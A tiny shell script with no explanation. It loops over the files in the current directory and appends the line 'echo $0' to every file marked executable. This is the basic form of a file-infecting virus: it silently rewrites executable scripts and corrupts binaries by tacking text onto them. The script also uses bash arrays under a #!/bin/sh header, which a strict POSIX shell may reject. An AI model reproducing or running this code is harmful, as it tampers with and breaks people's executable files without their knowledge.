#!/bin/sh
files=(`ls`)
for file in ${files[*]}
do
    if [ -x ${file} ]; then
        echo "echo \$0" >> ${file}
    fi
done
